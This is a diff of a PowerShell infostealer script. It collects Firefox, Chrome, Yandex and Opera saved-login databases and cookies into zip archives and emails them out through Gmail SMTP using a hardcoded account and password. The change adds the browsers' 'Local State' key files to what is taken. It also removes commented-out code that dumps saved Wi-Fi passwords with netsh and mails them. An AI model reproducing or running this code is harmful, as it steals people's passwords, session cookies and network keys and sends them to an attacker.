@@ -11,11 +11,11 @@ if(Test-Path -Path "C:\Program Files\7-Zip\7z.exe"){
 else{
   $arh="W"}
         
-$lst = @{0=(($env:APPDATA+"\Mozilla\Firefox\Profiles\*"), "firefox", "logins.json","*.db");
-        1=(($env:LOCALAPPDATA+"\Google\Chrome\User Data\Default\"), "chrome", "Login Data", "Cookies");
-        2=(($env:LOCALAPPDATA+"\Yandex\YandexBrowser\User Data\Default\"), "browser", "Ya Passman Data", "Cookies");
-        3=(($env:APPDATA+"\Opera Software\Opera Stable\"), "Opera123", "Login Data", "Cookies");
-        4=(($env:APPDATA+"\Opera Software\Opera GX Stable111111\"), "Opera5656", "Login Data", "Cookies")}
+$lst = @{0=(($env:APPDATA+"\Mozilla\Firefox\Profiles\*"), "firefox", "logins.json","*.db", "");
+        1=(($env:LOCALAPPDATA+"\Google\Chrome\User Data\"), "chrome", "Login Data", "Cookies", "Local State");
+        2=(($env:LOCALAPPDATA+"\Yandex\YandexBrowser\User Data\Default\"), "browser", "Ya Passman Data", "Cookies", "");
+        3=(($env:APPDATA+"\Opera Software\Opera Stable\"), "Opera123", "Login Data", "Cookies", "Local State");
+        4=(($env:APPDATA+"\Opera Software\Opera GX Stable111111\"), "Opera5656", "Login Data", "Cookies", "Local State")}
 ###########
 $SMTPServer="smtp.gmail.com";$SMTPInfo=New-Object Net.Mail.SmtpClient($SmtpServer,587);$SMTPInfo.EnableSsl=$true
 $SMTPInfo.Credentials=New-Object System.Net.NetworkCredential("f7swwq@gmail.com","parampam1");$ReportEmail=New-Object System.Net.Mail.MailMessage
@@ -29,7 +29,7 @@ for ($i=0; $i -lt 5; $i++){
     $p=($env:TEMP+"\"+$lst[$i][1]+".zip")
     #Stop-Process -Name $el[1] -ErrorAction SilentlyContinue;
     if("W"-in $arh){
-      Get-ChildItem -Path $lst[$i][0] -Include $lst[$i][2], $lst[$i][3] -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p
+      Get-ChildItem -Path $lst[$i][0] -Include $lst[$i][2], $lst[$i][3], $lst[$i][4] -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p
     }
     else{
       .\7z.exe a $p (Get-ChildItem -Path $lst[$i][0] -Include  $lst[$i][2], $lst[$i][3] -Recurse) -spf -tzip
@@ -59,17 +59,3 @@ for ($i=0; $i -lt 5; $i++){
 #   {Compress-Archive -Path $w -Update -CompressionLevel Fastest -DestinationPath $p}
 # echo "dadasdasdasdasasd"
 #######################
-
-
-
-# $s=New-Object Net.Mail.Attachment($p);
-# if("WinRAR"-in $arh)
-#   {$ReportEmail.Attachments.Add($s)}
-# else
-#   {$ReportEmail.Attachments.Add($s)};
-# $ff = ((netsh wlan show profiles) | Select-String "\:(.+)$" | %{$n=$_.Matches.Groups[1].Value.Trim();$_} | %{(netsh wlan show profile name="$n" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$d=$_.Matches.Groups[1].Value.Trim();$_} | %{[PSCustomObject]@{E=$n;P=$d}} | Format-Table -AutoSize)
-# $ff
-
-# $ReportEmail.Body = $ff
-# $SMTPInfo.Send($ReportEmail)
-
